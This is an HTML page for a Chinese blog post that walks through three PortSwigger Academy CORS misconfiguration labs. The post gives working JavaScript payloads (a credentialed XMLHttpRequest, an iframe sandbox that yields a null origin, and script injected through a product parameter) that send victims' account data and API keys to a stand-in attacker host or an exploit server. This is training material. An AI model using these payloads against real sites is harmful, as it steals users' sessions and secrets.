@@ -1,0 +1,567 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/favicon.png">
+  <link rel="icon" href="/img/favicon.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="John Doe">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="Portswigger Labs — CORS最常见的测试方法就是请求中添加Origin 标头： 1234GET &#x2F;sensitive-victim-data HTTP&#x2F;1.1Host: vulnerable-website.comOrigin: https:&#x2F;&#x2F;malicious-website.comCookie: sessionid&#x3D;...  1234HTTP&#x2F;1.1 200 OKAcces">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Portswigger Labs — CORS">
+<meta property="og:url" content="http://example.com/2024/07/23/Portswigger%20Labs%E2%80%8A%E2%80%94%E2%80%8ACORS/index.html">
+<meta property="og:site_name" content="Ry4nnnn">
+<meta property="og:description" content="Portswigger Labs — CORS最常见的测试方法就是请求中添加Origin 标头： 1234GET &#x2F;sensitive-victim-data HTTP&#x2F;1.1Host: vulnerable-website.comOrigin: https:&#x2F;&#x2F;malicious-website.comCookie: sessionid&#x3D;...  1234HTTP&#x2F;1.1 200 OKAcces">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/2023/04/27/file-upload/0231214141243992.png">
+<meta property="og:image" content="http://example.com/2023/04/27/file-upload/0231214141330406.png">
+<meta property="og:image" content="http://example.com/2023/04/27/file-upload/0231214141318168.png">
+<meta property="og:image" content="http://example.com/2023/04/27/file-upload/0231214142359510.png">
+<meta property="og:image" content="http://example.com/2023/04/27/file-upload/0231214142430951.png">
+<meta property="og:image" content="http://example.com/2023/04/27/file-upload/0231214142724485.png">
+<meta property="og:image" content="http://example.com/2023/04/27/file-upload/0231214144234244.png">
+<meta property="og:image" content="http://example.com/2023/04/27/file-upload/0231214144301502.png">
+<meta property="og:image" content="http://example.com/2023/04/27/file-upload/0231214144449074.png">
+<meta property="article:published_time" content="2024-07-23T12:50:00.000Z">
+<meta property="article:modified_time" content="2024-07-23T09:54:42.359Z">
+<meta property="article:author" content="John Doe">
+<meta property="article:tag" content="Portswigger Labs">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="http://example.com/2023/04/27/file-upload/0231214141243992.png">
+  
+  
+  <title>Portswigger Labs — CORS - Ry4nnnn</title>
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/css/bootstrap.min.css" />
+
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/github-markdown-css@4/github-markdown.min.css" />
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/hint.css@2/hint.min.css" />
+
+  
+    
+    
+      
+      <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@10/styles/github-gist.min.css" />
+    
+  
+
+  
+    <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3/dist/jquery.fancybox.min.css" />
+  
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_ba1fz6golrf.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+<!-- 自定义样式保持在最底部 -->
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.8.13","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"copy_btn":true,"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":"MgDyY5XEdtIKIZHTxzy3GBJV-gzGzoHsz","app_key":"P8Ab9EN1clJmhpYHpamFEiD9","server_url":"https://mgdyy5xe.lc-cn-n1-shared.com","path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+<body>
+  <header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>Ry4nnnn&#39;s Blog</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                归档
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                分类
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                标签
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                关于
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              &nbsp;<i class="iconfont icon-search"></i>&nbsp;
+            </a>
+          </li>
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+    <div class="banner" id="banner" parallax=true
+         style="background: url('/img/moon.png') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+          <div class="page-header text-center fade-in-up">
+            <span class="h2" id="subtitle" title="Portswigger Labs — CORS">
+              
+            </span>
+
+            
+              <div class="mt-3">
+  
+  
+    <span class="post-meta">
+      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+      <time datetime="2024-07-23 20:50" pubdate>
+        2024年7月23日 晚上
+      </time>
+    </span>
+  
+</div>
+
+<div class="mt-1">
+  
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-chart"></i>
+      2k 字
+    </span>
+  
+
+  
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-clock-fill"></i>
+      
+      
+      17 分钟
+    </span>
+  
+
+  
+  
+    
+      <!-- LeanCloud 统计文章PV -->
+      <span id="leancloud-page-views-container" class="post-meta" style="display: none">
+        <i class="iconfont icon-eye" aria-hidden="true"></i>
+        <span id="leancloud-page-views"></span> 次
+      </span>
+    
+  
+</div>
+
+            
+          </div>
+
+          
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div class="py-5" id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">Portswigger Labs — CORS</h1>
+            
+            <div class="markdown-body">
+              <h1 id="Portswigger-Labs-—-CORS"><a href="#Portswigger-Labs-—-CORS" class="headerlink" title="Portswigger Labs — CORS"></a>Portswigger Labs — CORS</h1><p>最常见的测试方法就是请求中添加Origin 标头：</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">GET</span> <span class="hljs-string">/sensitive-victim-data</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>vulnerable-website.com<br><span class="hljs-attribute">Origin</span><span class="hljs-punctuation">: </span>https://malicious-website.com<br><span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>sessionid=...<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs ada">HTTP/<span class="hljs-number">1.1</span> <span class="hljs-number">200</span> OK<br><span class="hljs-keyword">Access</span>-Control-Allow-Origin: https://malicious-website.com<br><span class="hljs-keyword">Access</span>-Control-Allow-Credentials: <span class="hljs-literal">true</span><br>...<br></code></pre></td></tr></table></figure>
+
+<p>这些标头声明允许从请求域 （ <code>malicious-website.com</code> ） 进行访问，并且跨源请求可以包含 cookie （ <code>Access-Control-Allow-Credentials: true</code> ），因此将在会话中进行处理。</p>
+<figure class="highlight actionscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs actionscript"><span class="hljs-keyword">var</span> req = <span class="hljs-keyword">new</span> XMLHttpRequest();<br>req.onload = reqListener;<br>req.open(<span class="hljs-string">&#x27;get&#x27;</span>,<span class="hljs-string">&#x27;https://vulnerable-website.com/sensitive-victim-data&#x27;</span>,<span class="hljs-literal">true</span>);<br>req.withCredentials = <span class="hljs-literal">true</span>;<br>req.send();<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">reqListener</span><span class="hljs-params">()</span> &#123;<br>   location=<span class="hljs-string">&#x27;//malicious-website.com/log?key=&#x27;</span>+<span class="hljs-keyword">this</span>.responseText;<br>&#125;;<br></code></pre></td></tr></table></figure>
+
+<h2 id="具有基本Origin反射的-Portswigger-Labs-—-CORS-漏洞"><a href="#具有基本Origin反射的-Portswigger-Labs-—-CORS-漏洞" class="headerlink" title="具有基本Origin反射的 Portswigger Labs — CORS 漏洞"></a>具有基本Origin反射的 Portswigger Labs — CORS 漏洞</h2><p>登录wiener账户，发现敏感信息：</p>
+<p><img src="/2023/04/27/file-upload/0231214141243992.png" srcset="/img/loading.gif" lazyload alt="image-20231214141243992"></p>
+<p>将代码放到exploit server：</p>
+<p><img src="/2023/04/27/file-upload/0231214141330406.png" srcset="/img/loading.gif" lazyload alt="image-20231214141330406"></p>
+<p>成功得到administrator的apikey：</p>
+<p><img src="/2023/04/27/file-upload/0231214141318168.png" srcset="/img/loading.gif" lazyload alt="image-20231214141318168"></p>
+<h2 id="具有可信空源的-Portswigger-Labs-—-CORS-漏洞"><a href="#具有可信空源的-Portswigger-Labs-—-CORS-漏洞" class="headerlink" title="具有可信空源的 Portswigger Labs — CORS 漏洞"></a>具有可信空源的 Portswigger Labs — CORS 漏洞</h2><p>此时example.com不被允许：</p>
+<p><img src="/2023/04/27/file-upload/0231214142359510.png" srcset="/img/loading.gif" lazyload alt="image-20231214142359510"></p>
+<p>尝试使用null：</p>
+<p><img src="/2023/04/27/file-upload/0231214142430951.png" srcset="/img/loading.gif" lazyload alt="image-20231214142430951"></p>
+<p>成功。</p>
+<p>下面结合iframe标签，投递payload（iframe sandbox会生成一个null origin请求）</p>
+<figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs stata">&lt;iframe sandbox=<span class="hljs-string">&quot;allow-scripts allow-top-navigation allow-forms&quot;</span> srcdoc=&quot;&lt;script&gt;<br>    <span class="hljs-keyword">var</span> req = new XMLHttpRequest();<br>    req.onload = reqListener;<br>    req.<span class="hljs-keyword">open</span>(&#x27;get&#x27;,&#x27;YOUR-<span class="hljs-keyword">LAB</span>-ID.web-security-academy.<span class="hljs-keyword">net</span>/accountDetails&#x27;,true);<br>    req.withCredentials = true;<br>    req.send();<br>    function reqListener() &#123;<br>        location=&#x27;YOUR-EXPLOIT-SERVER-ID.exploit-server.<span class="hljs-keyword">net</span>/<span class="hljs-keyword">log</span>?key=&#x27;+encodeURIComponent(this.responseText);<br>    &#125;;<br>&lt;/script&gt;&quot;&gt;&lt;/iframe&gt;<br></code></pre></td></tr></table></figure>
+
+<p><img src="/2023/04/27/file-upload/0231214142724485.png" srcset="/img/loading.gif" lazyload alt="image-20231214142724485"></p>
+<h2 id="受信任的不安全协议的-Portswigger-Labs-—-CORS-漏洞"><a href="#受信任的不安全协议的-Portswigger-Labs-—-CORS-漏洞" class="headerlink" title="受信任的不安全协议的 Portswigger Labs — CORS 漏洞"></a>受信任的不安全协议的 Portswigger Labs — CORS 漏洞</h2><p>这里只有子域名不受限制：</p>
+<p><img src="/2023/04/27/file-upload/0231214144234244.png" srcset="/img/loading.gif" lazyload alt="image-20231214144234244"></p>
+<p>点击商品页，check stock：</p>
+<p><img src="/2023/04/27/file-upload/0231214144301502.png" srcset="/img/loading.gif" lazyload alt="image-20231214144301502"></p>
+<p>这里域名符合要求。</p>
+<p>到exploit server投递payload：</p>
+<figure class="highlight xquery"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs xquery"><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="language-javascript"><span class="language-xml">    <span class="hljs-variable language_">document</span>.<span class="hljs-property">location</span>=<span class="hljs-string">&quot;http://stock.0a6500ef0389b5e4812a5c2e00c1001b.web-security-academy.net/?productId=4</span></span></span><span class="language-xml"><span class="language-handlebars"><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"><span class="hljs-keyword">var</span> req = <span class="hljs-keyword">new</span> <span class="hljs-title class_">XMLHttpRequest</span>(); req.<span class="hljs-property">onload</span> = reqListener; req.<span class="hljs-title function_">open</span>(<span class="hljs-string">&#x27;get&#x27;</span>,<span class="hljs-string">&#x27;https://0a6500ef0389b5e4812a5c2e00c1001b.web-security-academy.net/accountDetails&#x27;</span>,<span class="hljs-literal">true</span>); req.<span class="hljs-property">withCredentials</span> = <span class="hljs-literal">true</span>;req.<span class="hljs-title function_">send</span>();<span class="hljs-keyword">function</span> <span class="hljs-title function_">reqListener</span>(<span class="hljs-params"></span>) </span></span></span></span><span class="language-xquery">&#123;location=<span class="hljs-string">&#x27;https://exploit-0ad90010039ab5dc81185be9017500f3.exploit-server.net/log?key=&#x27;</span><span class="hljs-meta">%2bthis</span>.responseText; &#125;</span><span class="language-xml">;%3c/script&gt;</span><span class="language-xml">&amp;storeId=1&quot;</span><br><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><br></code></pre></td></tr></table></figure>
+
+<p>将js代码拼接到productid参数后面即可。</p>
+<p><img src="/2023/04/27/file-upload/0231214144449074.png" srcset="/img/loading.gif" lazyload alt="image-20231214144449074"></p>
+
+            </div>
+            <hr>
+            <div>
+              <div class="post-metas mb-3">
+                
+                  <div class="post-meta mr-3">
+                    <i class="iconfont icon-category"></i>
+                    
+                      <a class="hover-with-bg" href="/categories/Portswigger-Labs/">Portswigger Labs</a>
+                    
+                  </div>
+                
+                
+                  <div class="post-meta">
+                    <i class="iconfont icon-tags"></i>
+                    
+                      <a class="hover-with-bg" href="/tags/Portswigger-Labs/">Portswigger Labs</a>
+                    
+                  </div>
+                
+              </div>
+              
+                <p class="note note-warning">
+                  
+                    本博客所有文章除特别声明外，均采用 <a target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" rel="nofollow noopener noopener">CC BY-SA 4.0 协议</a> ，转载请注明出处！
+                  
+                </p>
+              
+              
+                <div class="post-prevnext">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2024/07/23/Portswigger%20Labs%E2%80%8A%E2%80%94%E2%80%8AApi-testing/">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">Portswigger Labs — Portswigger Labs — Api-testing-testing</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2024/07/23/Portswigger%20Labs%E2%80%8A%E2%80%94%E2%80%8ACSRF/">
+                        <span class="hidden-mobile">Portswigger Labs — CSRF</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+              <!-- Comments -->
+              <article class="comments" id="comments" lazyload>
+                
+                  
+                
+                
+  <div id="valine"></div>
+  <script type="text/javascript">
+    Fluid.utils.loadComments('#valine', function() {
+      Fluid.utils.createScript('https://cdn.jsdelivr.net/npm/valine@1/dist/Valine.min.js', function() {
+        var options = Object.assign(
+          {"appId":"MgDyY5XEdtIKIZHTxzy3GBJV-gzGzoHsz","appKey":"P8Ab9EN1clJmhpYHpamFEiD9","path":"window.location.pathname","placeholder":null,"avatar":"retro","meta":["nick","mail","link"],"requiredFields":[],"pageSize":10,"lang":"zh-CN","highlight":false,"recordIP":false,"serverURLs":"","emojiCDN":null,"emojiMaps":null,"enableQQ":false},
+          {
+            el: "#valine",
+            path: window.location.pathname
+          }
+        )
+        new Valine(options);
+        Fluid.utils.waitElementVisible('#valine .vcontent', () => {
+          Fluid.plugins.initFancyBox('#valine .vcontent img:not(.vemoji)');
+        })
+      });
+    });
+  </script>
+  <noscript>Please enable JavaScript to view the comments</noscript>
+
+
+              </article>
+            
+          </article>
+        </div>
+      </div>
+    </div>
+    
+      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+        <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+      </div>
+    
+  </div>
+</div>
+
+<!-- Custom -->
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v"
+                 for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+
+    
+  </main>
+
+  <footer class="text-center mt-5 py-3">
+  <div class="footer-content">
+     <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+  </div>
+  
+  <div class="statistics">
+    
+    
+
+    
+      
+        <!-- LeanCloud 统计PV -->
+        <span id="leancloud-site-pv-container" style="display: none">
+            总访问量 
+            <span id="leancloud-site-pv"></span>
+             次
+          </span>
+      
+      
+        <!-- LeanCloud 统计UV -->
+        <span id="leancloud-site-uv-container" style="display: none">
+            总访客数 
+            <span id="leancloud-site-uv"></span>
+             人
+          </span>
+      
+
+    
+  </div>
+
+
+  
+
+  
+</footer>
+
+
+  <!-- SCRIPTS -->
+  
+  <script  src="https://cdn.jsdelivr.net/npm/nprogress@0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/nprogress@0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js" ></script>
+<script  src="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+<!-- Plugins -->
+
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+  
+
+
+
+  
+    <script  src="https://cdn.jsdelivr.net/npm/tocbot@4/dist/tocbot.min.js" ></script>
+  
+  
+    <script  src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3/dist/jquery.fancybox.min.js" ></script>
+  
+  
+    <script  src="https://cdn.jsdelivr.net/npm/anchor-js@4/anchor.min.js" ></script>
+  
+  
+    <script defer src="https://cdn.jsdelivr.net/npm/clipboard@2/dist/clipboard.min.js" ></script>
+  
+
+
+
+
+  <script defer src="/js/leancloud.js" ></script>
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/typed.js@2/lib/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var title = document.getElementById('subtitle').title;
+      
+        typing(title);
+      
+    })(window, document);
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+
+
+
+
+<!-- 主题的启动项 保持在最底部 -->
+<script  src="/js/boot.js" ></script>
+
+
+</body>
+</html>
